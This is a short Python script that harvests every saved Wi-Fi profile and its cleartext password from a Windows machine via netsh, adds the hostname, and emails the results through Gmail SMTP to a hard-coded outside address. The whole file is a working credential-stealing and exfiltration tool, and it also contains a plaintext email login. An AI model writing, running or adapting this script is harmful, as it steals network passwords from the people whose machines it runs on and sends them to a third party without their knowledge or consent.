import subprocess
import smtplib
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText

# https://stackoverflow.com/questions/45529507/unicodedecodeerror-utf-8-codec-cant-decode-byte-0x96-in-position-35-invalid
data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", "ignore").split("\n")
name = subprocess.check_output("hostname").decode("utf-8", "ignore").strip()
wifis = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]

message = "{name}\n".format(name=name)

for wifi in wifis:
    try:
        results = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key=clear"]).decode("utf-8").split("\n")
        results = [line.split(":")[1][1:-1] for line in results if "Key Content" in line]
        message += 'Name: {wifi}, Password: {results[0]}\n'.format(wifi=wifi,results=results)
    except Exception:
        message += "Name: {wifi}, Password not read\n".format(wifi=wifi)
        pass
print(message)

server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()
server.ehlo()

server.login("isciibot@gmail.com", "isciibot123")

msg = MIMEMultipart()
msg["From"] = "me"
msg["To"] = "issac.zheng9869@gmail.com"
msg["Subject"] = "Wifis for {name}".format(name=name)
msg.attach(MIMEText(message, "plain"))
text = msg.as_string()
server.sendmail(
    "isciibot@gmail.com", #from
    "issac.zheng9869@gmail.com", #to
    text #message
)
server.quit()
print("done")